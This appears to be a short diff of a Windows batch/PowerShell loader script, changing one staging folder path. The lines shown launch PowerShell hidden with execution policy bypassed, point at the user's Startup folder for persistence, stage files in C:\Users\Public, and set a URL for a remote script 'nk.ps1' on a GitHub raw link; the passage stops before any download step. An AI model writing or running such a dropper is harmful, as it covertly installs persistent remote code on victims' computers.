@@ -1,7 +1,7 @@
 cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
 $LocalPath = "$env:LOCALAPPDATA"
 $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$PublicLibPath = "C:\Users\Public\Libraries"
+$PublicLibPath = "C:\Users\Public"
 
 # File URLs
 $File1Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/nk.ps1"
